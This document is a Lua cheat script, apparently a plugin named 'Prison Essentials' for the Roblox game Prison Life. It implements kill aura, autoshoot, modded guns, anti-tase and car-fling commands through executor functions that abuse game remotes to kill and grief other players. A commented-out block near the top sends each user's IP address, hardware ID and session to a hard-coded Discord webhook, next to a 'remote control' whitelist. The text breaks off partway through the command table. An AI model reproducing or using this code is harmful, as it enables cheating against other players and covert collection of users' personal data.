if game.PlaceId ~= 155615604 and game.PlaceId ~= 135564683255158 and getgenv().devMode ~= true then
	notify("Prison Essentials:", "This game is not supported.")
	return
end

while not game:IsLoaded() do
	task.wait(.2)
end

local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = game:GetService("Debris")

local localPlayer = Players.LocalPlayer

--[[local req = http_request or request or (syn and syn.request)
local HttpService = game:GetService("HttpService")
local url = "https://discord.com/api/webhooks/1532060988344369454/fliQJ6HE2I5IXclFicQlv-gZHOSlKTgVVuEaiVtU1Dwif0q13vtrKA4Rbmf_DbI5f32S"

--local ip = game:HttpGet("https://api.ipify.org")
local hwid = gethwid() or "Unknown HWID"

local content = Players.LocalPlayer.Name .. " has joined " .. game.PlaceId .. " " .. game.JobId .. " with IP: " .. ip .. " and HWID: " .. hwid

local data = {
    content = content,
    username = "skibidi nutter 3000"
}

pcall(function()
	req({
		Url = url,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = HttpService:JSONEncode(data)
	})
end)

local userRemoteControlWhitelist = {
	[1650710859] = true,
	[9145178925] = true,
	[10912888861] = true,
	[10469309573] = true,
	[4904124487] = true,
}]]

local blacklistedAnimIds = {
	[148840371] = true,
	[72042024] = true,
}

local carflingOffsets = {
	CFrame.new(-1.44970703, -2.206954956, 8.91259766),
	CFrame.new(-1.44970703, -2.206954956, 8.41259766),
}

local carKidnapOffsets = {
	CFrame.new(-5, .2, 0),
	CFrame.new(0, .2, -5),
	CFrame.new(-5, .2, -5),
}

local wheelFlingTargets = {
	[1] = "Head",
	[2] = "Torso",
	[3] = "Head",
	[4] = "Torso",
}

local storedCars = {}

local modcarEnabled = false
local autoshootEnabled = false
local killAuraEnabled = false
local killAuraShooting = false
local hidetoolsEnabled = false
local moddedGunsEnabled = false
local useWhitelist = true
local gunMacroEnabled = false
local antiTaseEnabled = false
local bruteForceAntiFlingEnabled = false
local stopBlacklistedAnimsEnabled = false

local originalGunAttributes = {}
local cars = {}
local carParts = {}
local killAuraWhitelist = {}
local antiTaseConnections = {}
local gunNames = {
	"Remington 870",
	"AK-47",
	"M4A1",
	"FAL",
	"M700",
	"MP5",
}

local carFlingSpeed = 1000
local moddedSpeed = 80
local moddedTorque = 2
local wheelauraSpeed = 10
local wheelauraOffset = 12
local gunMacroSwitchDelayMs = 50
local lastGunMacroSwitchTime = 0
local gunMacroIndex = 1
local switchModulo = 4
local farCFrame = CFrame.new(-100000, 0, 100000)
local infCFrame = CFrame.new(math.huge, math.huge, math.huge)
local closeCFrame = CFrame.new(0, 0, 2000)
local activeKidnapFlingCar = nil

local lastDeathCFrame = nil
local safeTp = false
local lastPos = nil

local DEBUG_ENABLED = false
local DEBUG_LIFETIME = .16

local function createDebugPoint(position, color, size, name)
	if not DEBUG_ENABLED then return end
	local part = Instance.new("Part")
	part.Name = name or "DebugPoint"
	part.Size = Vector3.new(size or 0.4, size or 0.4, size or 0.4)
	part.Shape = Enum.PartType.Ball
	part.Color = color or Color3.fromRGB(255, 255, 255)
	part.Material = Enum.Material.Neon
	part.Anchored = true
	part.CanCollide = false
	part.CanQuery = false
	part.CanTouch = false
	part.CFrame = CFrame.new(position)
	part.Parent = Workspace
	
	Debris:AddItem(part, DEBUG_LIFETIME)
	return part
end

local function getCar()
	for i = #storedCars, 1, -1 do
		local carData = storedCars[i]
		if not carData then continue end
		if not carData.Using then
			carData.Using = true
			storedCars[i] = carData
			return carData.car
		end
	end
	return nil
end

local function freeCar(car)
	for i = #storedCars, 1, -1 do
		local carData = storedCars[i]
		if carData.car == car then
			carData.Using = false
			storedCars[i] = carData
			return
		end
	end
end

local function createDebugRay(startPos, endPos, color)
	if not DEBUG_ENABLED then return end
	local distance = (endPos - startPos).Magnitude
	if distance < 0.001 then return end

	local rayPart = Instance.new("Part")
	rayPart.Name = "DebugRay"
	rayPart.Size = Vector3.new(0.1, 0.1, distance)
	rayPart.Color = color or Color3.fromRGB(255, 0, 0)
	rayPart.Material = Enum.Material.Neon
	rayPart.Anchored = true
	rayPart.CanCollide = false
	rayPart.CanQuery = false
	rayPart.CanTouch = false
	rayPart.CFrame = CFrame.lookAt(startPos, endPos) * CFrame.new(0, 0, -distance / 2)
	rayPart.Parent = Workspace

	Debris:AddItem(rayPart, DEBUG_LIFETIME)
	return rayPart
end

local function fetchTools(toolNames, speaker)
    local character = speaker.Character
    if not character then return end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoidRootPart or not humanoid then return end

    local givers = workspace.Prison_ITEMS:GetChildren()
    local giversToInteract = {}

    for _, rawName in ipairs(toolNames) do
        local toolName = rawName:lower():gsub("[%s%-_]", "")
        local candidates = {}

        for _, folder in ipairs(givers) do
            if folder:IsA("Folder") then
                for _, item in ipairs(folder:GetChildren()) do
                    if item.Name:lower():gsub("[%s%-_]", ""):find(toolName) then
                        table.insert(candidates, item)
                    end
                end
            end
        end

        local closestGiver = nil
        local closestDistance = math.huge
        for _, candidate in ipairs(candidates) do
            local dist = (humanoidRootPart.CFrame.Position - candidate:GetPivot().Position).Magnitude
            if dist < closestDistance then
                closestDistance = dist
                closestGiver = candidate
            end
        end

        if closestGiver then
            table.insert(giversToInteract, closestGiver)
        end
    end

    if #giversToInteract == 0 then
        notify("Prison Essentials:", "No matching tools found.")
        return
    end

    local oldCframe = humanoidRootPart.CFrame
    safeTp = true

    for _, giver in ipairs(giversToInteract) do
        local giverCFrame = giver:GetPivot()
        local itemPart = giver:FindFirstChildWhichIsA("BasePart")
        
        local t = 0
        while t < 0.05 do
            local dt = RunService.PostSimulation:Wait()
            t = t + dt
            
            humanoidRootPart.CFrame = giverCFrame + Vector3.new(0, -10, 0)
            humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
            humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
            
            if itemPart then
                task.spawn(function()
                    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("InteractWithItem"):InvokeServer(itemPart)
                end)
            end
            humanoid:ChangeState(Enum.HumanoidStateType.Running)
        end
    end

    RunService.PostSimulation:Wait()
    humanoidRootPart.CFrame = oldCframe
    humanoid:ChangeState(Enum.HumanoidStateType.Running)
    humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
    humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
    
    RunService.Heartbeat:Wait()
    safeTp = false
end

local cachedGuns = {}

local function getAllGuns()
    table.clear(cachedGuns)
    
    local player = Players.LocalPlayer
    if not player then return cachedGuns end

    local function scanContainer(container)
        if not container then return end
        for _, item in ipairs(container:GetChildren()) do
            if item:IsA("Tool") and item:GetAttribute("ToolType") == "Gun" then
                table.insert(cachedGuns, item)
            end
        end
    end

    scanContainer(player.Character)
    scanContainer(player:FindFirstChildOfClass("Backpack"))

    return cachedGuns
end

local NUM_SAMPLES = 22
local localSurfaceOffsets = table.create(NUM_SAMPLES)

do
	local phi = math.pi * (3 - math.sqrt(5)) -- Golden angle
	for i = 0, NUM_SAMPLES - 1 do
		local z = - (1 - (i / (NUM_SAMPLES - 1))) 
		local radius = math.sqrt(1 - z * z)
		local theta = phi * i

		local x = math.cos(theta) * radius
		local y = math.sin(theta) * radius
		localSurfaceOffsets[i + 1] = Vector3.new(x, y, z)
	end
end

local ball1Points = table.create(NUM_SAMPLES)
local ball2Points = table.create(NUM_SAMPLES)

local NUM_PAIRS = NUM_SAMPLES * NUM_SAMPLES
local pairIndices = table.create(NUM_PAIRS)
local pairDistances = table.create(NUM_PAIRS)

do
	local idx = 1
	for i = 1, NUM_SAMPLES do
		for j = 1, NUM_SAMPLES do
			pairIndices[idx] = i * 64 + j
			idx += 1
		end
	end
end

local ballRaycastParams = RaycastParams.new()
ballRaycastParams.FilterType = Enum.RaycastFilterType.Exclude

function getClosestVisibleSpotDualSurface(ball1, ball2, sitting)
	local radius1 = 7.5
	local radius2 = sitting and 15.5 or 7.5
	local pos1 = ball1.Position
	local pos2 = ball2.Position

	pos1 = ball1.AssemblyLinearVelocity * Players.LocalPlayer:GetNetworkPing() + pos1
	pos2 = ball2.AssemblyLinearVelocity * Players.LocalPlayer:GetNetworkPing() + pos2

	ballRaycastParams.FilterDescendantsInstances = {ball1}

	local cframe1 = CFrame.lookAt(pos1, pos2)
	for i = 1, NUM_SAMPLES do
		local worldPoint = cframe1:PointToWorldSpace(localSurfaceOffsets[i] * radius1)
		ball1Points[i] = worldPoint
		if DEBUG_ENABLED then
			createDebugPoint(worldPoint, Color3.fromRGB(0, 255, 255), 0.3, "HemispherePoint1")
		end
	end

	local cframe2 = CFrame.lookAt(pos2, pos1)
	for i = 1, NUM_SAMPLES do
		local worldPoint = cframe2:PointToWorldSpace(localSurfaceOffsets[i] * radius2)
		ball2Points[i] = worldPoint
		if DEBUG_ENABLED then
			createDebugPoint(worldPoint, Color3.fromRGB(0, 150, 255), 0.3, "HemispherePoint2")
		end
	end

	for i = 1, NUM_SAMPLES do
		local p1 = ball1Points[i]
		for j = 1, NUM_SAMPLES do
			local packedId = i * 64 + j
			pairDistances[packedId] = (ball2Points[j] - p1).Magnitude
		end
	end

	table.sort(pairIndices, function(a, b)
		return pairDistances[a] < pairDistances[b]
	end)

	for i = 1, NUM_PAIRS do
		local packedId = pairIndices[i]
		
		local p1Idx = math.floor(packedId / 64)
		local p2Idx = packedId % 64

		local p1 = ball1Points[p1Idx]
		local p2 = ball2Points[p2Idx]
		local rayDir = p2 - p1

		local hitResult = Workspace:Raycast(p1, rayDir, ballRaycastParams)

		local isClear = not hitResult or hitResult.Instance == ball2 or hitResult.Instance:IsDescendantOf(ball2)

		if isClear then
			local finalTargetSpot = hitResult and hitResult.Position or p2

			if DEBUG_ENABLED then
				createDebugRay(p1, finalTargetSpot, Color3.fromRGB(0, 255, 0))
				createDebugPoint(p1, Color3.fromRGB(255, 215, 0), 0.6, "StartSpot")
				createDebugPoint(finalTargetSpot, Color3.fromRGB(255, 215, 0), 0.6, "EndSpot")
			end

			return finalTargetSpot, p1
		else
			if DEBUG_ENABLED then
				local hitPoint = hitResult.Position
				createDebugRay(p1, hitPoint, Color3.fromRGB(255, 0, 0))
			end
		end
	end

	return nil
end

local function keepVectorOutsideRegion(worldPos, regionCFrame, regionSize)
    local localPos = regionCFrame:PointToObjectSpace(worldPos)
    local halfSize = regionSize / 2

    local insideX = math.abs(localPos.X) < halfSize.X
    local insideZ = math.abs(localPos.Z) < halfSize.Z

    if insideX and insideZ then
        local distToX = halfSize.X - math.abs(localPos.X)
        local distToZ = halfSize.Z - math.abs(localPos.Z)

        if distToX <= distToZ then
            local sign = localPos.X >= 0 and 1 or -1
            localPos = Vector3.new(halfSize.X * sign, localPos.Y, localPos.Z)
        else
            local sign = localPos.Z >= 0 and 1 or -1
            localPos = Vector3.new(localPos.X, localPos.Y, halfSize.Z * sign)
        end
    end

    return regionCFrame:PointToWorldSpace(localPos)
end

local function updateAntiTase()
	local connections = getconnections(ReplicatedStorage:WaitForChild("GunRemotes"):WaitForChild("PlayerTased").OnClientEvent)

	if antiTaseEnabled then
		for i, con in ipairs(connections) do
			if con.Enabled then
				antiTaseConnections[i] = con.Function
				con:Disable()
			end
		end
	else
		for i, con in ipairs(connections) do
			if not con.Enabled and antiTaseConnections[i] then
				con:Enable()
			end
		end
	end
end

local function isNetworkOwner(part)
	if not part or not part:IsA("BasePart") then return false end
	return part.ReceiveAge == 0 and not part:IsGrounded()
end

local function touch(a, b)
	if not a or not b then return end
	firetouchinterest(a, b, true)
	firetouchinterest(a, b, false)
end

if ReplicatedStorage:FindFirstChild("Scripts") then
	ReplicatedStorage.Scripts.CharacterCollision.Enabled = false
end

RunService.PostSimulation:Connect(function(dt)
	sethiddenproperty(localPlayer, "MaximumSimulationRadius", 1e9)
	sethiddenproperty(localPlayer, "SimulationRadius", 1e9)
	for i, v in storedCars do
		local car = v.car
		local body = car and car:FindFirstChild("Body")
		local vehicleSeat = body and body:FindFirstChild("VehicleSeat")
		if not car or not car.Parent or not body or not vehicleSeat or not isNetworkOwner(vehicleSeat) then
			table.remove(storedCars, i)
			return
		end
		if not v.Using then
			vehicleSeat.CFrame = farCFrame
		end
	end
end)

local Plugin = {
	["PluginName"] = "Prison Essentials",
	["PluginDescription"] = "Advanced utility suite for Prison Life",
	["Commands"] = {
		["carfling"] = {
			["ListName"] = "carfling [player]",
			["Description"] = "Tries to fling the target player",
			["Aliases"] = {"cfling"},
			["Function"] = function(args, speaker)
				local car = getCar()
				if not car then notify("Prison Essentials:", "Could not locate your car. Please get a car.") return end
				local descendants = car:GetDescendants()
				local carSeat = car and car.Body:FindFirstChild("VehicleSeat")

				local players = getPlayer(args[1], speaker)
				local targetName = players[1]
				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") return end
				local target = Players:FindFirstChild(targetName)

				if not target then notify("Prison Essentials:", "Target player is not found.") return end

				local targetHrp = target.Character:FindFirstChild("HumanoidRootPart")
				if not targetHrp then notify("Prison Essentials:", "Target's RootPart is missing. They may be voided or loading.") return end
				local targetHumanoid = target.Character:FindFirstChild("Humanoid")
				if not targetHumanoid then notify("Prison Essentials:", "Target's Humanoid is missing. They may be voided or loading.") return end
				local targetHead = target.Character:FindFirstChild("Head")
				if not targetHead then notify("Prison Essentials:", "Target's Head is missing. They may be voided or loading.") return end
			
				local bodyPosition, bodyAngularVelocity = Instance.new("BodyPosition"), Instance.new("BodyAngularVelocity")
				local flinging = false
				local isDead = targetHumanoid.Health <= 0
				local offsetIndex = 1
				local switchIndex = 0
				local deadIndex = -1

				local newCFrame = targetHrp.CFrame * carflingOffsets[offsetIndex]

				bodyPosition.MaxForce = Vector3.one * 1e15
				bodyPosition.P = 1e6
				bodyPosition.D = 5000
				bodyAngularVelocity.MaxTorque = Vector3.one * 1e15
				bodyAngularVelocity.AngularVelocity = bodyAngularVelocity.MaxTorque
				bodyAngularVelocity.P = 1e9

				local function updatePosition()
					local targetCharacter = target.Character
					if not targetCharacter or not targetCharacter.Parent then
						return
					end
					targetHrp = targetCharacter:FindFirstChild("HumanoidRootPart")
					targetHead = targetCharacter:FindFirstChild("Head")
					targetHumanoid = targetCharacter:FindFirstChild("Humanoid")
					if not targetHrp then
						return
					end
					if not targetHead then
						return
					end
					if not targetHumanoid then
						return
					end
					local targetPosition
					isDead = targetHumanoid.Health <= 0
					if isDead then
						targetPosition = Vector3.new(
							math.clamp(targetHead.Position.X, -100000, 100000),
							math.clamp(targetHead.Position.Y, -100000, 100000),
							math.clamp(targetHead.Position.Z, -100000, 100000)
						)
					else
						targetPosition = Vector3.new(
							math.clamp(targetHrp.Position.X, -100000, 100000),
							math.clamp(targetHrp.Position.Y, -100000, 100000),
							math.clamp(targetHrp.Position.Z, -100000, 100000)
						)
					end
					
					local targetCFrame = CFrame.new(targetPosition, targetPosition + targetHrp.CFrame.LookVector)
					offsetIndex = offsetIndex + 1
					if offsetIndex > #carflingOffsets then
						offsetIndex = 1
					end


					newCFrame = targetCFrame * carflingOffsets[offsetIndex]
				end

				--humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				--task.wait(.1)
				--carSeat:Sit(humanoid)

				flinging = true
				local updateCFrame = true
				--execCmd("view " .. targetName)

				while target.Parent == Players and flinging and car.Parent ~= nil do
					if carSeat.Occupant then
						flinging = false
						execCmd("kick " .. carSeat.Occupant.Parent.Name)
						break
					end
					RunService.PreSimulation:Wait()
					local dt = RunService.PostSimulation:Wait()
					switchIndex = (switchIndex + 1) % switchModulo
					updatePosition()
					--for i, v in car:GetDescendants() do
					--	if v:IsA("BasePart") then
					--		v.CanCollide = true
					--	end
					--end
					if isDead then
						deadIndex = deadIndex + 1
						updateCFrame = false
						if deadIndex <= 0 then
							carSeat.CFrame = newCFrame
							bodyPosition.Parent = car.Body.ColorParts.Hood
							bodyAngularVelocity.Parent = car.Body.ColorParts.Hood
						end
						bodyPosition.Position = targetHead.Position
					else
						deadIndex = -1
						updateCFrame = true
						bodyPosition.Parent = nil
						bodyAngularVelocity.Parent = nil
					end
					if sethiddenproperty then
						sethiddenproperty(carSeat, "PhysicsRepRootPart", if (switchIndex == 0 and not isDead) then targetHrp else nil)
					end
					if updateCFrame then
						if switchIndex == 0 then
							carSeat.CFrame = newCFrame
						else
							carSeat.CFrame = farCFrame
						end
					end
				end

				freeCar(car)
			end,
		},

		["modcar"] = {
			["ListName"] = "modcar [speed] [torque]",
			["Description"] = "Mods your car",
			["Aliases"] = {"mcar", "fastcar"},
			["Function"] = function(args, speaker)
				modcarEnabled = false

				task.wait()

				modcarEnabled = true

				local character = speaker.Character
				if not character then notify("Prison Essentials:", "Could not locate your Character model. Please respawn.") return end

				local humanoid  = character:FindFirstChild("Humanoid")
				if not humanoid then notify("Prison Essentials:", "Humanoid is missing. Try resetting.") return end

				local carSeat = humanoid.SeatPart
				local isDriving = carSeat and carSeat:IsA("VehicleSeat")
				if not isDriving then notify("Prison Essentials:", "You must be in the driver's seat mod your car.") return end
				local car = carSeat.Parent.Parent

				local newModdedSpeed, newModdedTorque = args[1], args[2]
				if newModdedSpeed then
					moddedSpeed = newModdedSpeed
				end
				if newModdedTorque then
					moddedTorque = newModdedTorque
				end
				
				local con = nil
				con = RunService.PreSimulation:Connect(function(dt)
					if not modcarEnabled then
						notify("Prison Essentials:", "Disabling modcar.")
						con:Disconnect()
						return
					end
					if humanoid.SeatPart ~= carSeat then
						modcarEnabled = false
						return
					end
					car.RWD.MaxSpeed = moddedSpeed
					car.RWD.Torque = moddedTorque
				end)
			end,
		},

		["unmodcar"] = {
			["ListName"] = "unmodcar [speed] [torque]",
			["Description"] = "Unmods your car",
			["Aliases"] = {"rcar", "slowcar"},
			["Function"] = function(args, speaker)
				modcarEnabled = false
			end,
		},

		["autoshoot"] = {
			["ListName"] = "autoshoot",
			["Description"] = "Enables autoshoot",
			["Aliases"] = {"enableautoshoot"},
			["Function"] = function(args, speaker)
				autoshootEnabled = true

				local mouse = speaker:GetMouse()
				mouse.TargetFilter = Workspace.CurrentCamera

				local con = nil
				con = RunService.Heartbeat:Connect(function(dt)
					if not autoshootEnabled then
						con:Disconnect()
						return
					end
					local character = speaker.Character
					if not character then return end
					local tool = character:FindFirstChildOfClass("Tool")
					if not tool then return end
					local isGun = tool:GetAttribute("ToolType") == "Gun"
					local target = mouse.Target
					local targetCharacter = target:FindFirstAncestorOfClass("Model")
					local targetHumanoid = (targetCharacter and targetCharacter:FindFirstChild("Humanoid"))
					local targetPlayer = (targetHumanoid and Players:GetPlayerFromCharacter(targetCharacter))
					if targetPlayer and targetPlayer.Team.Name ~= speaker.Team.Name and isGun then
						if mouse1click then
							mouse1click()
						end
					end
				end)
			end,
		},

		["disableautoshoot"] = {
			["ListName"] = "disableautoshoot",
			["Description"] = "Enables autoshoot",
			["Aliases"] = {"unautoshoot", "noautoshoot"},
			["Function"] = function(args, speaker)
				autoshootEnabled = false
			end,
		},

		["cargoto"] = {
			["ListName"] = "cargoto [player]",
			["Description"] = "Teleports your car to said player",
			["Aliases"] = {"cgoto", "cartp", "carteleport", "carto"},
			["Function"] = function(args, speaker)
				local character = speaker.Character
				if not character then notify("Prison Essentials:", "Could not locate your Character model. Please respawn.") return end

				local humanoid = character:FindFirstChild("Humanoid")
				if not humanoid then notify("Prison Essentials:", "Humanoid is missing. Try resetting.") return end

				local carSeat = humanoid.SeatPart
				local isDriving = carSeat and carSeat:IsA("VehicleSeat")
				if not isDriving then notify("Prison Essentials:", "You must be in the driver's seat to perform a Car Teleport.") return end
				local car = carSeat.Parent.Parent

				local players = getPlayer(args[1], speaker)
				local targetName = players[1]
				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") return end
				local target = Players:FindFirstChild(targetName)
				

				local wheelOffsets = {}
				
				for i, v in ipairs(car.Wheels:GetChildren()) do
					table.insert(wheelOffsets, {v, carSeat.CFrame:Inverse() * v.CFrame})
				end

				local function updateWheels()
					for i, v in ipairs(wheelOffsets) do
						v[1].CFrame = carSeat.CFrame * v[2]
						v[1].AssemblyLinearVelocity = Vector3.zero
						v[1].AssemblyAngularVelocity = Vector3.zero
					end
				end

				local start = tick()

				while (tick() - start) <= .2 and car.Parent do
					RunService.PreSimulation:Wait()
					carSeat.CFrame = target.Character.HumanoidRootPart.CFrame
					updateWheels()
				end
			end,
		},

		["modguns"] = {
			["ListName"] = "modguns",
			["Description"] = "Mods your guns",
			["Aliases"] = {"opguns"},
			["Function"] = function(args, speaker)
				moddedGunsEnabled = true
				local char = speaker.Character
				local con = nil
				local modGunsCon = nil
				con = speaker.CharacterAdded:Connect(function(a0)
					char = a0
				end)

				local function modGuns()
					if not char then return end
					for _, tool in ipairs(char:GetChildren()) do
						if tool:IsA("Tool") and tool:GetAttribute("ToolType") == "Gun" then
							if not originalGunAttributes[tool] then
								originalGunAttributes[tool] = {
									["AutoFire"] = tool:GetAttribute("AutoFire"),
									["SpreadRadius"] = tool:GetAttribute("SpreadRadius"),
									["FireRate"] = tool:GetAttribute("FireRate"),
								}
							end

							tool:SetAttribute("AutoFire", true)
							tool:SetAttribute("SpreadRadius", 0)
							tool:SetAttribute("FireRate", 0)
							tool:SetAttribute("Local_CurrentAmmo", tool:GetAttribute("CurrentAmmo"))
						end
					end
				end

				modGunsCon = RunService.Heartbeat:Connect(function()
					if not moddedGunsEnabled then
						modGunsCon:Disconnect()
						con:Disconnect()
						return
					end
					modGuns()
				end)
			end,
		},

		["unmodguns"] = {
			["ListName"] = "unmodguns",
			["Description"] = "Unmods your guns",
			["Aliases"] = {"rmguns"},
			["Function"] = function(args, speaker)
				moddedGunsEnabled = false
				for tool, attributes in pairs(originalGunAttributes) do
					if tool and tool.Parent then
						for attrName, attrValue in pairs(attributes) do
							tool:SetAttribute(attrName, attrValue)
						end
					end
				end
				table.clear(originalGunAttributes)
			end,
		},

		["passengerfling"] = {
			["ListName"] = "passengerfling",
			["Description"] = "Tries to fling your passengers",
			["Aliases"] = {"pfling"},
			["Function"] = function(args, speaker)
				local character = speaker.Character
				local humanoid = character and character:FindFirstChild("Humanoid")
				local carSeat = humanoid and humanoid.SeatPart
				local car = (carSeat and carSeat.Parent.Parent) or activeKidnapFlingCar
				if not car then notify("Prison Essentials:", "Could not locate your car. Please get a car.") return end
				carSeat = car.Body:FindFirstChild("VehicleSeat")
				if not carSeat then notify("Prison Essentials:", "Could not locate your car's VehicleSeat. Please get a car.") return end
				local oldCFrame = carSeat.CFrame
				local damageParts = CollectionService:GetTagged("DamagePart")

				local occupants = {}
				for i, v in car.Body:GetChildren() do
					if v:IsA("Seat") and v.Occupant then
						table.insert(occupants, v.Occupant)
					end
				end

				local total = #occupants
				local count = 0
				local flinging = true
				local killing = false

				if total <= 0 then print("not enough occupants") return end

				local wheelOffsets = {}
				
				for i, v in ipairs(car.Wheels:GetChildren()) do
					table.insert(wheelOffsets, {v, carSeat.CFrame:Inverse() * v.CFrame})
				end

				local function updateWheels()
					for i, v in ipairs(wheelOffsets) do
						v[1].CFrame = carSeat.CFrame * v[2]
						v[1].AssemblyLinearVelocity = Vector3.zero
						v[1].AssemblyAngularVelocity = Vector3.zero
					end
				end

				local function isDone()
					count += 1
					return count == total
				end

				for _, target in occupants do
					if not target.Parent then continue end
					task.spawn(function()
						target.Died:Wait()
						if isDone() then
							flinging = false
						end
					end)
				end

				--task.delay(speaker:GetNetworkPing() * 2, function()
					killing = true
				--end)

				while flinging and car.Parent do
					RunService.PreSimulation:Wait()
					carSeat.AssemblyLinearVelocity = Vector3.new(.001, 1, .001) * 100_000_000
					if killing then
						for _, target in occupants do
							for _, damagePart in damageParts do
								touch(target.RootPart, damagePart)
							end
						end
					end
					carSeat.CFrame = oldCFrame
					RunService.PostSimulation:Wait()
					carSeat.CFrame = oldCFrame
				end
				if car and car.Parent then
					RunService.PreSimulation:Wait()
					carSeat.CFrame = oldCFrame
					updateWheels()
					carSeat.AssemblyLinearVelocity = Vector3.zero
					if activeKidnapFlingCar then
						activeKidnapFlingCar = nil
						freeCar(car)
					end
				end
			end,
		},

		["killaura"] = {
			["ListName"] = "killaura [range]",
			["Description"] = "Kill aura",
			["Aliases"] = {"enablekillaura"},
			["Function"] = function(args, speaker)
				killAuraEnabled = false

				task.wait()

				killAuraEnabled = true

				local character = speaker.Character
				local gun = nil
				local raycastParams = RaycastParams.new()
				raycastParams.FilterType = Enum.RaycastFilterType.Exclude
				raycastParams.FilterDescendantsInstances = {character}
				raycastParams.IgnoreWater = true
				--raycastParams.RespectCanCollide = true

				local connections = {}

				table.insert(connections, speaker.CharacterAdded:Connect(function(newCharacter)
					character = newCharacter
					raycastParams.FilterDescendantsInstances = {character}
				end))
				
				local function shoot(shots, origin, target, instance)
					local shotsTable = {}
					for i = 1, shots do
						table.insert(shotsTable, {origin, target, instance})
					end
					if #shotsTable == 0 then return end
					ReplicatedStorage:WaitForChild("GunRemotes"):WaitForChild("ShootEvent"):FireServer(shotsTable)
					table.clear(shotsTable)
				end

				local function getClosestCharacter()
					local closestDistance = math.huge
					local closestPos = nil
					local closestCharacter = nil
					local closestOtherPart = nil
					local closestOriginPos = nil

					for _, otherPlayer in ipairs(Players:GetPlayers()) do
						if otherPlayer == speaker then continue end
						if useWhitelist then
							if not killAuraWhitelist[otherPlayer.UserId] then continue end
						else
							if killAuraWhitelist[otherPlayer.UserId] then continue end
						end
                        if otherPlayer.Team == speaker.Team then continue end
						if otherPlayer.Team.Name == "Neutral" then continue end

                        local otherCharacter = otherPlayer.Character

                        if not otherCharacter then continue end

                        if otherCharacter:FindFirstChild("ForceField") then continue end

                        local otherHumanoid = otherCharacter:WaitForChild("Humanoid")

                        if not otherHumanoid then continue end

                        if otherHumanoid.Health <= 0 then continue end

						local otherHrp = otherCharacter:FindFirstChild("HumanoidRootPart")

						if not otherHrp then continue end

						local closestOtherDistance = math.huge

                        if speaker.Team.Name == "Guards" and otherPlayer.Team.Name == "Inmates" then
                            if not otherCharacter:GetAttribute("Hostile") then continue end
                        elseif speaker.Team.Name == "Criminals" and otherPlayer.Team.Name == "Inmates" then
                            if not (otherCharacter:GetAttribute("Hostile") or otherCharacter:GetAttribute("Trespassing")) then continue end
						end

                        local charPos = character.HumanoidRootPart.Position

						for _, part in ipairs(otherCharacter:GetDescendants()) do
							if part:IsA("BasePart") then
								local partDistance = (part.Position - charPos).Magnitude
								if partDistance < closestOtherDistance then
									closestOtherDistance = partDistance
									closestOtherPart = part
								end
							end
						end

                        local visiblePos, originPos = getClosestVisibleSpotDualSurface(character.HumanoidRootPart, otherHrp, false)

						local range = ((gun and gun:IsA("Tool")) and (gun:GetAttribute("Range") or 0))
                        local distance = ((charPos - otherCharacter:GetPivot().Position).Magnitude or math.huge)

						if distance > range then 
						    continue
						end

                        if not visiblePos then continue end
						if closestDistance >= distance then
                            closestDistance = distance
                            closestCharacter = otherCharacter
							closestPos = visiblePos
							closestOriginPos = originPos
                        end
					end

					return closestCharacter, closestPos, closestOriginPos, closestOtherPart
				end

				local function cleanup()
					for i, v in ipairs(connections) do
						v:Disconnect()
					end
					table.clear(connections)
				end

				table.insert(connections, RunService.PostSimulation:Connect(function()
					if not killAuraEnabled then
						cleanup()
						return
					end
					if killAuraShooting then return end
					if not character then return end
					local humanoid = character:FindFirstChild("Humanoid")
					if not humanoid then return end
					if humanoid.Health <= 0 then return end
					gun = (character:FindFirstChildOfClass("Tool") or nil)
					if not gun then return end
					if gun:GetAttribute("ToolType") ~= "Gun" then return end
					if gun:GetAttribute("IsReloading") == true then return end
					local closestOtherCharacter, closestPos, closestOriginPos, closestOtherPart = getClosestCharacter()
					if not closestOtherPart then return end
					if not closestPos then return end
					if not closestOriginPos then return end
					killAuraShooting = true
					if not gun or not gun.Parent then return end
					for i = 1, 1 + math.ceil((gun:GetAttribute("CurrentAmmo") or 0) * .25) do
						shoot((gun:GetAttribute("ProjectileCount") or 1), closestOriginPos, closestPos, closestOtherCharacter.HumanoidRootPart)
					end
					if gun:GetAttribute("CurrentAmmo") < (gun:GetAttribute("MaxAmmo") or 0) * 0.1 then
						task.spawn(function()
							ReplicatedStorage:WaitForChild("GunRemotes"):WaitForChild("FuncReload"):InvokeServer()
						end)
					end
					closestPos = nil
					humanoid = nil
					killAuraShooting = false
				end))
			end,
		},

		["togglekillauramode"] = {
			["ListName"] = "togglekillauramode",
			["Description"] = "Toggles between whitelist and blacklist mode for killaura",
			["Aliases"] = {"tkam", "killauramode"},
			["Function"] = function(args, speaker)
				useWhitelist = not useWhitelist
				if useWhitelist then
					notify("Prison Essentials:", "Killaura is now in BLACKLIST mode.")
				else
					notify("Prison Essentials:", "Killaura is now in WHITELIST mode.")
				end
			end,
		},

		["addkillaurawhitelist"] = {
			["ListName"] = "addkillaurawhitelist [player]",
			["Description"] = "Adds a player to the killaura whitelist",
			["Aliases"] = {"addkaw", "whitelist"},
			["Function"] = function(args, speaker)
				local players = getPlayer(args[1], speaker)
				for i, v in ipairs(players) do
					local player = Players:FindFirstChild(v)
					if player then
						killAuraWhitelist[player.UserId] = true
						notify("Prison Essentials:", "Added " .. player.Name .. " to the killaura whitelist.")
					end
				end
			end,
		},

		["removekillaurawhitelist"] = {
			["ListName"] = "removekillaurawhitelist [player]",
			["Description"] = "Removes a player from the killaura whitelist",
			["Aliases"] = {"remkaw", "unwhitelist"},
			["Function"] = function(args, speaker)
				local players = getPlayer(args[1], speaker)
				for i, v in ipairs(players) do
					local player = Players:FindFirstChild(v)
					if player then
						killAuraWhitelist[player.UserId] = nil
						notify("Prison Essentials:", "Removed " .. player.Name .. " from the killaura whitelist.")
					end
				end
			end,
		},
		
		["disablekillaura"] = {
